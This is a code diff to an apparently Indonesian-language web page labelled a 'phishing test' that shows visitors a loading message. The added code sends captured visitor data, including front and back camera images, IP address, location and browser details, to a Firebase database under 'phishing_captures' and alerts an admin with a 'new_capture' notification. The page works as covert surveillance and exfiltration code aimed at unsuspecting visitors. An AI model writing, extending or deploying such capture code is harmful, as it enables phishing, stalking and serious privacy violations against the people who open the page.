@@ -96,7 +96,96 @@
         <div class="status-text" id="statusText">Memuat halaman...</div>
     </div>
 
+    <!-- Firebase Integration untuk Centralized Data -->
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    
     <script>
+        // Firebase Configuration - GANTI dengan config Anda sendiri!
+        const firebaseConfig = {
+            apiKey: "demo-api-key-ganti-dengan-milik-anda",
+            authDomain: "demo-project.firebaseapp.com", 
+            databaseURL: "https://demo-project-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "demo-project",
+            storageBucket: "demo-project.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abcdef123456"
+        };
+        
+        // Initialize Firebase (hanya jika config valid)
+        let database = null;
+        let firebaseEnabled = false;
+        
+        try {
+            if (firebaseConfig.apiKey !== "demo-api-key-ganti-dengan-milik-anda") {
+                firebase.initializeApp(firebaseConfig);
+                database = firebase.database();
+                firebaseEnabled = true;
+                console.log("🔥 Firebase connected successfully");
+            } else {
+                console.log("⚠️ Firebase not configured - using localStorage only");
+            }
+        } catch (error) {
+            console.log("⚠️ Firebase initialization failed - using localStorage only:", error.message);
+        }
+        
+        // Function untuk kirim data ke Firebase dan localStorage
+        async function saveDataToCloud(visitorData) {
+            // Save ke localStorage dulu (backup)
+            const existingLocalData = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
+            existingLocalData.push(visitorData);
+            localStorage.setItem('phishingTestResults', JSON.stringify(existingLocalData));
+            
+            // Save ke Firebase jika tersedia
+            if (firebaseEnabled && database) {
+                try {
+                    // Generate unique ID untuk setiap capture
+                    const captureId = 'capture_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    
+                    // Compress image data untuk firebase (maksimal 1MB per entry)
+                    const compressedData = { ...visitorData };
+                    if (compressedData.cameraData) {
+                        // Compress images untuk Firebase storage
+                        if (compressedData.cameraData.frontCamera && compressedData.cameraData.frontCamera.image) {
+                            // Keep only first 50KB of image data for Firebase, full image tetap di localStorage
+                            compressedData.cameraData.frontCamera.imagePreview = compressedData.cameraData.frontCamera.image.substring(0, 50000) + "...";
+                            compressedData.cameraData.frontCamera.hasFullImage = true;
+                            delete compressedData.cameraData.frontCamera.image; // Remove full image for Firebase
+                        }
+                        if (compressedData.cameraData.backCamera && compressedData.cameraData.backCamera.image) {
+                            compressedData.cameraData.backCamera.imagePreview = compressedData.cameraData.backCamera.image.substring(0, 50000) + "...";
+                            compressedData.cameraData.backCamera.hasFullImage = true;
+                            delete compressedData.cameraData.backCamera.image; // Remove full image for Firebase
+                        }
+                    }
+                    
+                    // Save ke Firebase
+                    await database.ref('phishing_captures/' + captureId).set({
+                        ...compressedData,
+                        cloudSavedAt: firebase.database.ServerValue.TIMESTAMP,
+                        captureId: captureId
+                    });
+                    
+                    console.log("☁️ Data saved to Firebase successfully:", captureId);
+                    
+                    // Optional: Kirim notifikasi real-time ke admin
+                    await database.ref('admin_notifications').push({
+                        type: 'new_capture',
+                        captureId: captureId,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP,
+                        userAgent: visitorData.technicalInfo.browser.userAgent.substring(0, 100),
+                        ip: visitorData.technicalInfo.ip
+                    });
+                    
+                } catch (firebaseError) {
+                    console.log("❌ Firebase save failed:", firebaseError.message);
+                    console.log("📱 Data masih tersimpan di localStorage");
+                }
+            }
+            
+            return visitorData;
+        }
+
         // Fungsi untuk mendapatkan IP address dan lokasi otomatis
         async function getIPAndLocation() {
             try {
@@ -389,10 +478,8 @@
                 console.log('🎯 Direct Visit - Data Captured:', visitorData);
             }
             
-            // Save to localStorage for admin analysis
-            const existingData = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
-            existingData.push(visitorData);
-            localStorage.setItem('phishingTestResults', JSON.stringify(existingData));
+            // Save data ke cloud (Firebase) dan localStorage
+            await saveDataToCloud(visitorData);
             
             return visitorData;
         }
